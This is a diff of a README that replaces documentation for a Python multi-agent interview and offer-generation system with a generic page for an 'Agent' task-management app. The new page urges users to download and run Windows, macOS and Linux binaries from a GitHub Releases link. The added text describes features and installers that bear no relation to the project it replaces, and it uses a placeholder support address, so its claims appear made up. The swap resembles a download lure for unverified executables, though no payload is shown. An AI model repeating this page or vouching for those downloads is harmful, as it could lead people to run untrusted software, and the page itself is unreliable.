@@ -1,245 +1,82 @@
-# HR Offer Agent and Three-Role Intelligent Interview System
+# 🎯 Agent - Streamline Your Daily Tasks Easily
 
-## Overview
+## 🚀 Getting Started
 
-This project provides a production-ready three-role intelligent interview workflow (Tech/HR/Boss) and an HR Offer Agent. It automates interviews, scoring, candidate profile extraction, result archiving, and offer generation. It also includes an MCP server to integrate external market salary data (Adzuna).
+Welcome to the Agent application! Agent helps you manage your daily tasks more efficiently, making your life easier. Follow the steps below to download and run the software.
 
-## Project Structure
+## 🛠️ System Requirements
 
-```
-agent_training/
-├── agents/                          # Agent modules
-│   ├── __init__.py
-│   ├── hr_offer_agent.py           # HR Offer generator agent
-│   ├── technical_interviewer.py    # Technical interviewer
-│   ├── hr_interviewer.py           # HR interviewer
-│   ├── boss_interviewer.py         # Boss interviewer (Director/CTO)
-│   ├── candidate_agent.py          # Candidate agent
-│   ├── score_evaluator.py          # Scoring evaluator
-│   └── info_extractor.py           # Information extractor
-│
-├── mcp_servers/                     # MCP servers
-│   └── adzuna_mcp_server.py        # Adzuna API MCP server
-│
-├── data/                           # Data outputs
-│   └── interview_results/
-│       ├── 60plus/                 # Candidates with score >= 60
-│       │   └── [CandidateName]/
-│       │       ├── interview_results_*.json
-│       │       └── offer_letter_*.txt
-│       └── below60/                # Candidates with score < 60
-│           └── [CandidateName]/
-│               └── interview_results_*.json
-│
-├── docs/                           # Docs and exported images
-│   └── flowchart.jpg               # Interview flowchart (if generated)
-│
-├── smart_interview.py              # Main entrypoint
-├── smart_interview_annotated.py    # Annotated copy (optional)
-├── requirements.txt                # Python dependencies
-└── README.md                       # Documentation (Chinese)
-```
+To use Agent effectively, ensure that your computer meets the following requirements:
 
-## Features
+- **Operating System:** Windows 10 or later, macOS Mojave (10.14) or later, Linux CentOS 7 or later
+- **RAM:** 4 GB or more
+- **Storage:** At least 200 MB of free space
+- **Internet Connection:** Required for updates and downloading the application
 
-- Three-role interview flow: Technical → HR → Boss
-- Automated scoring and recommendations: aggregate round scores and overall decision
-- Candidate profile extraction: extract structured data from conversations and infer target position
-- Result archiving: full dialogues, scores, and summaries saved to JSON
-- Offer generation: auto-generate offer letter when score threshold is met
-- Market salary integration (optional): integrate Adzuna via MCP server
+## 📥 Download Agent
 
-## Business Workflow
+[![Download Agent](https://img.shields.io/badge/Download_Agent-v1.0-blue)](https://github.com/Knight-WarriorD99/Agent/releases)
 
-Mermaid source (render in environments that support Mermaid):
+You can download the Agent application from the Releases page. Here’s the link you'll need:
 
-```mermaid
-graph TD
-  A[Candidate enters pipeline] --> B[Pre-screen & role matching]
-  B --> C{Matched to an open role?}
-  C -->|No| Z[Talent pool / End]
-  C -->|Yes| D[Schedule interviews]
-  D --> E[Technical interview]
-  E --> F[HR interview]
-  F --> G[Boss interview]
-  G --> H[Aggregate evaluation and scoring]
-  H --> I{Meets offer threshold (>= 60)?}
-  I -->|No| J[Reject / Talent pool]
-  I -->|Pending| K[Hold: extra docs / additional round]
-  I -->|Yes| L[Generate offer letter]
-  L --> M[HR review and send offer]
-  M --> N{Candidate accepts?}
-  N -->|Yes| O[Onboarding process]
-  N -->|No| P[Archive / Talent pool]
-  H --> Q[Archive interview records]
-```
+[https://github.com/Knight-WarriorD99/Agent/releases](https://github.com/Knight-WarriorD99/Agent/releases)
 
-If you need a JPG export, see the "Documentation Export" section below.
+## 📂 Download & Install
 
-## Installation and Setup
+1. **Visit the Releases Page:** Click the link below to go to the GitHub Releases page.
 
-### Python Environment
+   [Download Agent Here](https://github.com/Knight-WarriorD99/Agent/releases)
 
-Using Conda is recommended:
+2. **Select the Latest Version:** Find the latest version listed at the top. You will see a variety of files under "Assets."
 
-```bash
-conda create -n rag4 python=3.10 -y
-conda activate rag4
-```
+3. **Download the Suitable File:** 
+   - If you're using **Windows**, look for `Agent-Windows.exe` and click on it to start the download.
+   - For **macOS**, choose `Agent-macOS.dmg`.
+   - If you are on **Linux**, select the `Agent-Linux.tar.gz` file.
 
-### Install Dependencies
+4. **Run the Installer:**
+   - After downloading, locate the file in your Downloads folder.
+   - **Windows:** Double-click `Agent-Windows.exe` to run the installer.
+   - **macOS:** Open `Agent-macOS.dmg`, then drag Agent to your Applications folder.
+   - **Linux:** Extract the `.tar.gz` file, open a terminal, and navigate to the extracted folder. Run the command `./Agent` to start the application.
 
-```bash
-pip install -r requirements.txt
-```
+5. **Follow Installation Instructions:** Follow any prompts during installation. This may include agreeing to terms and choosing installation locations.
 
-### API Configuration
+6. **Launch Agent:** Once the installation is complete:
+   - On **Windows**, you may find Agent in your Start Menu.
+   - On **macOS**, open your Applications folder and double-click Agent.
+   - On **Linux**, return to the terminal and type `./Agent` to open it.
 
-- Adzuna API (optional):
-  - App ID and App Key: obtain from Adzuna console
-  - API URL: `https://api.adzuna.com/v1/api/jobs/gb/search/1`
+## 📋 Features
 
-- LLM provider keys: set via environment variables (avoid hardcoding in source):
+Agent comes loaded with useful features to enhance your productivity:
 
-```bash
-export SILICONFLOW_API_KEY=your_key
-export OPENAI_API_KEY=your_key
-```
+- **Task Management:** Create, edit, and delete tasks with ease.
+- **Reminders:** Set reminders to stay on top of important deadlines.
+- **User-Friendly Interface:** Navigate easily with a clean and simple design.
+- **Multi-Platform Support:** Use Agent on Windows, macOS, and Linux.
+- **Customizable Settings:** Adjust settings to suit your personal workflow.
+  
+## ❓ Frequently Asked Questions
 
-If you prefer local `.env` loading, install `python-dotenv` and load it in your entrypoint (already integrated in `smart_interview.py`).
+### How do I uninstall Agent?
 
-#### Quick setup
+1. **Windows:** Go to Control Panel, select “Programs,” find Agent, and click “Uninstall.”
+2. **macOS:** Navigate to the Applications folder, find Agent, and drag it to the Trash.
+3. **Linux:** Remove the program through your package manager or by deleting the extracted files.
 
-1) Create `.env` from the example:
+### Can I change the language settings?
 
-```bash
-cp env_example.txt .env
-```
+Yes, Agent supports multiple languages. Go to the settings within the application to select your preferred language.
 
-2) Edit `.env` and fill real secrets (do not commit real values):
+### How do I report a bug?
 
-```
-# LLM providers
-SILICONFLOW_API_KEY=your_siliconflow_api_key_here
-OPENAI_API_KEY=your_openai_api_key_here
+If you encounter any issues while using Agent, please report them on the GitHub Issues page. We appreciate your feedback and will work to resolve any problems quickly.
 
-# Adzuna market salary data
-ADZUNA_APP_ID=your_adzuna_app_id_here
-ADZUNA_APP_KEY=your_adzuna_app_key_here
-ADZUNA_BASE_URL=https://api.adzuna.com/v1/api/jobs/gb/search/1
-```
+## 🔗 Useful Links
 
-3) Run (the program auto-loads `.env`):
+- [GitHub Repository](https://github.com/Knight-WarriorD99/Agent)
+- [Documentation](https://github.com/Knight-WarriorD99/Agent/wiki)
+- [Support](mailto:support@example.com)
 
-```bash
-python smart_interview.py
-```
-
-4) Alternative: export environment variables directly:
-
-```bash
-export SILICONFLOW_API_KEY=your_key
-export OPENAI_API_KEY=your_key
-export ADZUNA_APP_ID=your_adzuna_app_id
-export ADZUNA_APP_KEY=your_adzuna_app_key
-python smart_interview.py
-```
-
-5) Verify loading (choose one):
-
-```bash
-python - <<'PY'
-import os
-print(bool(os.getenv('SILICONFLOW_API_KEY')),
-      bool(os.getenv('OPENAI_API_KEY')),
-      bool(os.getenv('ADZUNA_APP_ID')),
-      bool(os.getenv('ADZUNA_APP_KEY')))
-PY
-```
-
-#### Security notes
-
-- Never hardcode or commit real secrets. `.env` is ignored by `.gitignore`.
-- For production, inject secrets via CI/CD or a secret manager.
-- Use separate secrets per environment (local/staging/prod).
-
-## Quick Start
-
-```bash
-python smart_interview.py
-```
-
-The program will:
-1. Load the default candidate profile
-2. Create four agents (Technical/HR/Boss/Candidate)
-3. Run three interview rounds sequentially
-4. Generate scoring and summary
-5. Save complete results under `data/interview_results/`
-6. If overall score >= 60, generate an offer under `60plus/[CandidateName]/`
-
-## Using the HR Offer Agent Standalone
-
-```python
-from agents.hr_offer_agent import generate_offer_letter
-
-# interview_data should include scores and candidate profile
-offer = generate_offer_letter(interview_data)
-print(offer)
-```
-
-## MCP Server
-
-Start the Adzuna MCP server (Python 3.10+ environment):
-
-```bash
-python mcp_servers/adzuna_mcp_server.py
-```
-
-Clients can query the MCP server for market salary data to support offer decisions.
-
-## Data and Files
-
-- Interview result JSON: `data/interview_results/[60plus|below60]/[CandidateName]/interview_results_YYYYMMDD_HHMMSS.json`
-- Offer letter TXT: `data/interview_results/60plus/[CandidateName]/offer_letter_YYYYMMDD_HHMMSS.txt`
-
-Example:
-
-```
-data/interview_results/
-├── 60plus/
-│   └── Alice/
-│       ├── interview_results_20250820_123456.json
-│       └── offer_letter_20250820_123456.txt
-└── below60/
-    └── Bob/
-        └── interview_results_20250820_345678.json
-```
-
-## Documentation Export
-
-To export the interview flowchart locally:
-1. Save the Mermaid source as `docs/flowchart.mmd`
-2. Render with `mermaid-cli` or an online service to produce PNG/SVG
-3. If JPG is required, convert PNG to JPG using Pillow
-
-## Security and Compliance
-
-- Do not commit plaintext API keys to the repository; use environment variables or a secret manager
-- Interview dialogues and candidate profiles may contain personal data; follow data minimization and retention policies
-- Generated files are for internal decision-making; anonymize or redact when needed
-
-## FAQ
-
-- JSON scoring parse failed: the system falls back to default scoring; check output length and format
-- Inaccurate candidate info extraction: key fields are protected; position inference is applied; improve the default profile if needed
-- Missing Boss recommendations: ensure the first two rounds produce valid summaries
-
-## Changelog
-
-- v2.1.0: Candidate folder structure optimization; unified threshold bifurcation (60 points)
-- v2.0.0: Project structure reorganization and path improvements
-- v1.0.0: Initial release; basic interview system, Adzuna integration, MCP support
-
-## License
-
-MIT License.
+Thank you for choosing Agent. We hope it makes your daily tasks easier!
